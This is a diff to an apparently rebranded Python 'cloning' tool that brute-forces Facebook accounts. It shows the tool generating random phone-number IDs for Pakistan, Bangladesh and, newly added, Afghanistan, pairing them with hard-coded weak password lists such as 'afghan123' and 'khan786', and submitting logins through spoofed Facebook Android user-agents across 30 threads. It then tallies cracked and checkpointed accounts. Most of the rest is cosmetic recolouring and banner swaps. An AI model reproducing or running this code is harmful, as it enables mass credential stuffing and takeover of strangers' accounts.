@@ -48,25 +48,20 @@ for agent in range(10000):
         fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
         ugen.append(fullagnt)
 logo=("""\033[1;37m
-  .d8b.  db   dD d888888b d8b   db  d888b 
- d8' `8b 88 ,8P'   `88'   888o  88 88' Y8b
- 88ooo88 88,8P      88    88V8o 88 88       \033[1;34m\033[1;37m
- 88~~~88 88`8b      88    88 V8o88 88  ooo.\033[1;31m\033[1;37m
- 88   88 88 `88.   .88.   88  V888 88. ~8~  \033[1;35m\033[1;37m
- YP   YP YP   YD Y888888P VP   V8P  Y888P   
-──────────────────────────────────────༽
- Author    : IMTIAZ LKING
- Github    : AKING110
- Facebook  : MR.AKING.GANDO
- Tool Name : AKING-PRO
- Type type : PAID
- Version   : 1.9.8
-----------------------------------------------
- AKING Pro version 1.9.8
- For Haters: Tumhare Okat Nhi Mere BAAJI chodne Ke 
-\033[1;37m----------------------------------------------""")
+        \033[1;32m.8888888b. 88888888888 8888888 
+         \033[1;32m888   Y88b    888       888   
+         \033[1;32m888    888    888       888   
+         \033[1;32m888   d88P    888       888   
+         \033[1;31m8888888P"     888       888   
+         \033[1;31m888           888       888   
+         \033[1;31m888           888       888   
+         \033[1;31m888           888     8888888  \033[1;35mV.15.3
+\033[1;32m------------------------------------------------------\033[1;37m
+         Author    : Muhammad Zakaryia
+         Facebook  : Bakhti Rahman 
+\033[1;31m------------------------------------------------------\033[1;37m""")
 def linex():
-        print('\033[1;37m----------------------------------------------')
+        print('\033[1;32m------------------------------------------------------\033[1;37m')
 def clear():
         os.system('clear')
         print(logo)
@@ -129,9 +124,9 @@ def public():
                 print('\033[1;31mYour cookies han expired...');time.sleep(1)
                 login()
         try:
-                jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;37m '))
+                jum=int(input(' \033[1;32mHow many ids you went to clone ?\033[1;37m '))
         except ValueError:
-                exit(' Put only digits not latters ')
+                exit(' \033[1;31mPut only digits not latters ')
         if jum<1 or jum>5000:
                 exit()
         ses=requests.Session()
@@ -141,15 +136,15 @@ def public():
                 kl = input(f'\033[1;37m Put link no.{yz+0}: ')
                 usrr.append(kl)
         linex()
-        print(' All method working try 1 by 1 ')
+        print(' \033[1;32mAll method working ')
         linex()
-        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+        print(' [1] Method 1 (for new ids) \n [2] Method 2 (for mix ids)\n [3] Method 3 (for old ids)')
         linex()
-        mthd = input(' Choose method: ')
+        mthd = input(' \033[1;32mChoose method: ')
         linex()
-        print(' Do you went show cp account? (y/n): ')
+        print(' \033[1;32mDo you went show cp account? (y/n): ')
         linex()
-        cx=input(' Choose: ')
+        cx=input(' \033[1;31mChoose: ')
         if cx in ['y','Y','yes','Yes','1']:
                 pcp.append('y')
         else:
@@ -173,19 +168,19 @@ def public():
         try:
                 plist = []
                 try:
-                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                        ps_limit = int(input(' \033[1;32mHow many passwords do you want to add ? '))
                 except:
                         ps_limit =1
                 linex()
-                print('\033[1;32m exp: first last,firtslast,first123')
+                print('\033[1;32m exp: \033[1;32mfirst last,firtslast,first123')
                 linex()
                 for i in range(ps_limit):
-                        plist.append(input(f' Put password {i+1}: '))
+                        plist.append(input(f' \033[1;32mPut password {i+1}: '))
                 with tred(max_workers=30) as crack_submit:
                         clear()
                         total_ids = str(len(id))
-                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;35m~\033[1;37mMethod -> \033[1;31mM{mthd}')
+                        print("\033[1;35mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in id:
                                 ids,names = user.split('|')
@@ -198,10 +193,10 @@ def public():
                                         crack_submit.submit(api1,ids,names,passlist)
                 print('\033[1;37m')
                 linex()
-                print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' \033[1;32mThe process has completed')
+                print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
-                input(' Press enter to back ')
+                input('\033[1;31m Press enter to back ')
                 os.system('python AKING.py')
         except requests.exceptions.ConnectionError:
                 exit(f' No internet connection')
@@ -215,41 +210,41 @@ def menu():
         #       chk()
                 x = ("sex")
                 if x == ("sex"):
-                        print(' [1] File cloning\n [2] Create ids file\n [3] Public cloning\n [4] Random number cloning\n [5] Random gmail crack\n [6] WhatsApp Group (join)\n [7] Download Vpn\n [8] How To Use Video\n [0] Exit menu')
+                        print(' [1] File cloning\n [2] Public cloning\n [3] Random number cloning\n [4] WhatsApp Group (join)\n [0] Exit menu')
                         linex()
-                        xd=input(' Choose an option: ')
+                        xd=input(' \033[1;32mChoose an option: ')
                         if xd in ['1','01']:
                                 clear()
-                                print(' Put file example:  /sdcard/File.txt  etc..')
+                                print('\033[1;31m Put file example:  \033[1;32m/sdcard/File.txt  etc..')
                                 linex()
-                                file = input(' Put file path\033[1;37m: ')
+                                file = input(' \033[1;32mPut file path\033[1;37m: ')
                                 try:
                                         fo = open(file,'r').read().splitlines()
                                 except FileNotFoundError:
-                                        print(' File location not found ')
+                                        print('\033[1;31m File location not found ')
                                         time.sleep(1)
                                         menu()
                                 clear()
-                                print(' All method working try 1 by 1 ')
+                                print(' \033[1;32mAll method working try ')
                                 linex()
-                                print(' [1] Method 1 (for new ids) \n [2] Method 2 (for old ids)\n [3] Method 3 (for old ids)')
+                                print(' \033[1;32m[1] Method 1 \033[1;31m(for new ids) \n\033[1;32m [2] Method 2 \033[1;31m(for old ids)\n \033[1;32m[3] Method 3 \033[1;31m(for old ids)')
                                 linex()
-                                mthd=input(' Choose: ')
+                                mthd=input(' \033[1;32mChoose: ')
                                 linex()
                                 plist = []
                                 try:
-                                        ps_limit = int(input(' How many passwords do you want to add ? '))
+                                        ps_limit = int(input(' \033[1;32mHow many passwords do you want to add ? '))
                                 except:
                                         ps_limit =1
                                 linex()
-                                print('\033[1;32m exp: first last,firtslast,first123')
+                                print('\033[1;31m exp: \033[1;32mfirst last,firtslast,first123')
                                 linex()
                                 for i in range(ps_limit):
-                                        plist.append(input(f' Put password {i+1}: '))
+                                        plist.append(input(f' \033[1;32mPut password {i+1}: '))
                                 linex()
-                                print(' Do you went show cp account? (y/n): ')
+                                print(' \033[1;31mDo you went show cp account? (y/n): ')
                                 linex()
-                                cx=input(' Choose: ')
+                                cx=input(' \033[1;32mChoose: ')
                                 if cx in ['y','Y','yes','Yes','1']:
                                         pcp.append('y')
                                 else:
@@ -257,8 +252,8 @@ def menu():
                                 with tred(max_workers=30) as crack_submit:
                                         clear()
                                         total_ids = str(len(fo))
-                                        print(' Total account : \033[1;32m'+total_ids+f' \033[1;33m>\033[1;36m> \033[1;37mMethod -> \033[1;37mM{mthd}')
-                                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                                        print(' \033[1;31mTotal account : \033[1;32m'+total_ids+f' \033[1;31m-> \033[1;32mM{mthd}')
+                                        print("\033[1;32mUse flight mode for speed up\033[1;37m")
                                         linex()
                                         for user in fo:
                                                 ids,names = user.split('|')
@@ -271,32 +266,34 @@ def menu():
                                                         crack_submit.submit(api1,ids,names,passlist)
                                 print('\033[1;37m')
                                 linex()
-                                print(' The process has completed')
-                                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                                print(' \033[1;32mThe process has completed\033[1;37m')
+                                print(' Total \033[1;32mOK/\033[1;31mCP: '+str(len(oks))+'/'+str(len(cps)))
                                 linex()
-                                input(' Press enter to back ')
+                                input(' \033[1;31mPress enter to back ')
                                 os.system('python AKING.py')
-                        elif xd in ['2','02']:
+                        #elif xd in ['2','02']:
                                 import dump
                                 dump.Main()
-                        elif xd in ['3','03']:
+                        elif xd in ['2','02']:
                                 public()
-                        elif xd in ['4','04']:
+                        elif xd in ['3','03']:
                                 clear()
-                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Gmail cloning\n [0] Back menu')
+                                print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] Afghanistan cloning\n [4] Gmail cloning\n [0] Back menu')
                                 linex()
-                                x=input(' Choose: ')
+                                x=input('\033[1;32m Choose: ')
                                 if x in ['1','01']:
                                         pak()
                                 elif x in ['2','02']:
                                         bd()
                                 elif x in ['3','03']:
+                                    	Afg()
+                                elif x in ['4','04']:
                                         gmail()
                                 else:
                                         menu()
                         elif xd in ['5','05']:
                                 gmail()
-                        elif xd in ['6','06']:
+                        elif xd in ['4','04']:
                                 wx=('Dsj9JMWoixk4Qsje0Ng3nA')
                                 os.system(f'xdg-open https://chat.whatsapp.com/{wx}');menu()
                         elif xd in ['7','07']:
@@ -306,7 +303,7 @@ def menu():
                         elif xd in ['0','00']:
                                 exit(' Thanks for use  ')
                         else:
-                                exit(' Option not found in menu...')
+                                exit(' \033[1;31mOption not found in menu...')
                 else:
                         print("\033[1;31m Your Not Premium User...!\033[1;37m");time.sleep(1)
                         clear()
@@ -336,10 +333,10 @@ def menu():
 def pak():
                 user=[]
                 clear()
-                print('\033[1;31m Code example: 0306,0315,0335,0345')
-                code = input('\033[1;37m put code: ')
+                print('\033[1;31m Code example: \033[1;32m0306,0315,0335,0345')
+                code = input('\033[1;31m put code: ')
                 try:
-                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+                        limit = int(input('\033[1;31m example: \033[1;31m2000, 3000, 5000, 10000\n\033[1;32m put limit: '))
                 except ValueError:
                         limit = 5000
                 for nmbr in range(limit):
@@ -348,9 +345,9 @@ def pak():
                 with tred(max_workers=30) as Aking:     
                         clear()
                         tl = str(len(user))
-                        print(' Total account : \033[1;32m'+tl)
-                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
-                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        print(' \033[1;31mTotal account : \033[1;32m'+tl)
+                        print(f'\033[1;31m Choice code ..:\033[1;32m '+code)
+                        print(f'\033[1;32mUse flight mode for speed up\033[1;97m')
                         linex()
                         for psx in user:
                                 ids = code+psx
@@ -358,18 +355,18 @@ def pak():
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
-                print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' \033[1;32mThe process has completed')
+                print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
-                input(' Press enter to back ')
+                input(' \033[1;31mPress enter to back ')
                 os.system('python AKING.py')
 def bd():
                 user=[]
                 clear()
-                print('\033[1;31m Code example: 016,017,018,019')
-                code = input('\033[1;37m put code: ')
+                print('\033[1;31m Code example: \033[1;32m016,017,018,019')
+                code = input('\033[1;31m put code: ')
                 try:
-                        limit = int(input('\033[1;31m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+                        limit = int(input('\033[1;31m example:\033[1;32m 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
                 except ValueError:
                         limit = 5000
                 for nmbr in range(limit):
@@ -378,9 +375,9 @@ def bd():
                 with tred(max_workers=30) as Aking:     
                         clear()
                         tl = str(len(user))
-                        print(' Total account : \033[1;32m'+tl)
-                        print(f'\033[1;37m Choice code ..:\033[1;32m '+code)
-                        print(f'\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;97m')
+                        print(' \033[1;31mTotal account : \033[1;32m'+tl)
+                        print(f'\033[1;31m Choice code ..:\033[1;32m '+code)
+                        print(f'\033[1;32mUse flight mode for speed up\033[1;97m')
                         linex()
                         for psx in user:
                                 ids = code+psx
@@ -388,32 +385,32 @@ def bd():
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
-                print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' \033[1;32mThe process has completed')
+                print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
-                input(' Press enter to back ')
+                input(' \033[1;31mPress enter to back ')
                 os.system('python AKING.py')
 def gmail():
                 os.system('rm -rf .re.txt')
                 clear()
-                print('\033[1;37m example: muhammad, ali, sajjad, faizan\033[1;97m')
+                print('\033[1;31m example: \033[1;32mmuhammad, ali, sajjad, faizan\033[1;97m')
                 linex()
-                first = input(' Put first name: ')
+                first = input(' \033[1;32mPut first name: ')
                 linex()
-                print('\033[1;37m example: khan, ahmad, ali \033[1;97m')
+                print('\033[1;31m example: \033[1;32mkhan, ahmad, ali \033[1;97m')
                 linex()
-                last = input(' Put last name: ')
+                last = input(' \033[1;31mPut last name: ')
                 linex()
-                print(' Example: @gmail.com , @yahoo.com etc...')
+                print('\033[1;31m Example:\033[1;32m @gmail.com , @yahoo.com etc...')
                 linex()
                 domain = input(' domain: ')
                 linex()
                 try:
-                        limit=int(input(' Put limit: '))
+                        limit=int(input(' \033[1;31mPut limit: '))
                 except ValueError:
                         limit = 5000
                 linex()
-                print(' Getting gmails...')
+                print(' \033[1;32mGetting gmails...')
                 lists = ['3','4']
                 for xd in range(limit):
                         lchoice = random.choice(lists)
@@ -427,8 +424,8 @@ def gmail():
                 with tred(max_workers=30) as Aking:
                         total = str(len(fo))
                         clear()
-                        print(' Total account : \033[1;32m'+total)
-                        print("\033[1;37m \x1b[38;5;208mUse flight mode for speed up\033[1;37m")
+                        print(' \033[1;31mTotal account : \033[1;32m'+total)
+                        print("\033[1;32mUse flight mode for speed up\033[1;37m")
                         linex()
                         for user in fo:
                                 ids,names = user.split('|')
@@ -443,14 +440,44 @@ def gmail():
                                 Aking.submit(rndm,ids,passlist)
                 print('\033[1;37m')
                 linex()
-                print(' The process has completed')
-                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                print(' \033[1;32mThe process has completed')
+                print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
                 linex()
-                input(' Press enter to back ')
+                input(' \033[1;31mPress enter to back ')
+                os.system('python AKING.py')
+def Afg():
+                user=[]
+                clear()
+                print('\033[1;31m Code example: \033[1;32m077,078,079,070')
+                code = input('\033[1;31m put code: ')
+                try:
+                        limit = int(input('\033[1;31m example: \033[1;32m2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
+                except ValueError:
+                        limit = 5000
+                for nmbr in range(limit):
+                        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+                        user.append(nmp)
+                with tred(max_workers=30) as Aking:     
+                        clear()
+                        tl = str(len(user))
+                        print(' \033[1;31mTotal account : \033[1;32m'+tl)
+                        print(f'\033[1;31m Choice code ..:\033[1;32m '+code)
+                        print(f'\033[1;32mUse flight mode for speed up\033[1;97m')
+                        linex()
+                        for psx in user:
+                                ids = code+psx
+                                passlist = [psx,ids,'afghan123','afghan1122','afghanistan123','khan1234','khan12','khan786','afghanistan','afghan123456','khankhan123','10002000','20003000','50006000','afghan1122','afghanafghan','pubg123','pubg12345']
+                                Aking.submit(rndm,ids,passlist)
+                print('\033[1;37m')
+                linex()
+                print(' \033[1;32mThe process has completed')
+                print(' \033[1;32mTotal OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+                linex()
+                input(' \033[1;31mPress enter to back ')
                 os.system('python AKING.py')
 def ffb(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write('\r\r\033[1;37m [AKING-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(' ')[0]
@@ -492,7 +519,7 @@ xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT
 def api(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [AKING-M2] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -506,7 +533,7 @@ def api(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.0,width=240,height=400};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I5800L;FBSV/2.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -562,7 +589,7 @@ def api(ids,names,passlist):
 def api1(ids,names,passlist):
                 try:
                         global ok,loop
-                        sys.stdout.write('\r\r\033[1;37m [AKING-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+                        sys.stdout.write('\r\r\033[1;37m [AKING-M3] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
                                 ln = names.split(' ')[1]
@@ -576,7 +603,7 @@ def api1(ids,names,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.0,width=480,height=800};'+f'FBLC/es_CU;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-S7262;FBSV/4.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
@@ -643,7 +670,7 @@ def rndm(ids,passlist):
                                 gtt=random.choice(xxxxx)
                                 gttt=random.choice(xxxxx)
                                 android_version=str(random.randrange(6,13))
-                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.0,width=1080,height=2460};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/infinix;FBBD/infinix;FBPN/{str(fbs)};FBDV/X6716B;FBSV/13;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+                                ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.0,width=240,height=400};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Movistar;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/GT-I5800L;FBSV/2.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
                                 device_id = str(uuid.uuid4())
                                 adid = str(uuid.uuid4())
                                 data = {'adid':adid,
